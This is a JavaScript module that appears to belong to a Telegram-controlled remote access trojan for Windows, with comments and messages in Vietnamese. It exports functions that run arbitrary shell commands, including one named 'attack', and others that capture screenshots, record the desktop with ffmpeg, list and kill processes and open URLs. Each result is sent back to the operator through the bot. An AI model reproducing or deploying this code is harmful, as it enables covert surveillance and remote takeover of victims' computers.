const exec = require("child_process").exec;
const screenshot = require("screenshot-desktop");
const fs = require("fs");
const os = require("os");
const path = require("path");

async function openUrl(browserurl) {
  return new Promise((resolve, reject) => {
    exec(`start ${browserurl}`, (err, stdout, stderr) => {
      if (err) {
        reject(err);
      } else {
        resolve(stdout || stderr);
      }
    });
  });
}

async function killApp(programname) {
  return new Promise((resolve, reject) => {
    exec(`taskkill /IM ${programname}`, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      } else {
        resolve(stdout || stderr);
      }
    });
  });
}

async function screenshotEx(ctx) {
  try {
    const img = await screenshot({ format: "png" });
    await ctx.replyWithPhoto({ source: img });
  } catch (error) {
    console.error("Lỗi:", error);
    ctx.reply("Đã xảy ra lỗi khi chụp và gửi ảnh.");
  }
}

async function executeCommand(command) {
  return new Promise((resolve, reject) => {
    exec(command, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      } else {
        resolve(stdout || stderr);
      }
    });
  });
}

async function attack(cmd) {
  return new Promise((resolve, reject) => {
    const homePath = path.join(os.homedir());
    exec(`cd ${homePath} && ${cmd}`, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      } else {
        resolve(stdout || stderr);
      }
    });
  });
}
// const MAX_MESSAGE_LENGTH = 2000;
// function splitMessage(message) {
//   const parts = [];
//   while (message.length > 0) {
//     parts.push(message.substring(0, MAX_MESSAGE_LENGTH));
//     message = message.substring(MAX_MESSAGE_LENGTH);
//   }
//   return parts;
// }
// async function allAp() {
//   return new Promise((resolve, reject) => {
//     exec("tasklist", (err, stdout, stderr) => {
//       if (err) {
//         reject(err);
//       } else {
//         try {
//           if (stdout.length <= MAX_MESSAGE_LENGTH) {
//             resolve(stdout || stderr);
//           } else {
//             const parts = splitMessage(stdout);
//             resolve(parts);
//           }
//         } catch (error) {
//           console.log(error);
//           reject(error);
//         }
//       }
//     });
//   });
// }

const allAp = async () => {
  return new Promise((resolve, reject) => {
    exec("tasklist", (err, stdout, stderr) => {
      if (err) {
        reject(err);
      } else {
        resolve(stdout || stderr);
      }
    });
  });
};
// const run = async () => {
//   const filee = path.join(__dirname, "aplica.txt");
//   const parts = await allAp();
//   fs.writeFileSync(filee, parts.join(""));
// };
const writeAndSend = async (ctx) => {
  try {
    const parts = await allAp();
    const fileTxt = "Appslication.txt";
    fs.writeFileSync(fileTxt, parts);
    await ctx.replyWithDocument({ source: fileTxt });
    ctx.reply("all application");
    fs.unlinkSync(fileTxt);
  } catch (error) {
    ctx.reply(error);
  }
};

const recordScreen = async (ctx) => {
  try {
    const tempFileName = `temp_video_${Date.now()}.mp4`;
    const tempFilePath = path.join(os.tmpdir(), tempFileName);

    exec(
      `ffmpeg -f gdigrab -framerate 60 -t 10 -i desktop "${tempFilePath}"`,
      async (err) => {
        if (err) {
          console.error("Lỗi khi ghi video:", err);
          return;
        }

        await ctx.replyWithVideo({ source: tempFilePath });
        ctx.reply("gửi video thành công");

        fs.unlink(tempFilePath, (unlinkErr) => {
          if (unlinkErr) {
            console.error("Lỗi khi xóa file :", unlinkErr);
          }
        });
      }
    );
  } catch (err) {
    await ctx.reply("Lỗi không xác định: " + err.message);
  }
};

module.exports = {
  openUrl,
  killApp,
  screenshotEx,
  executeCommand,
  attack,
  writeAndSend,
  recordScreen,
  // allAp,
};
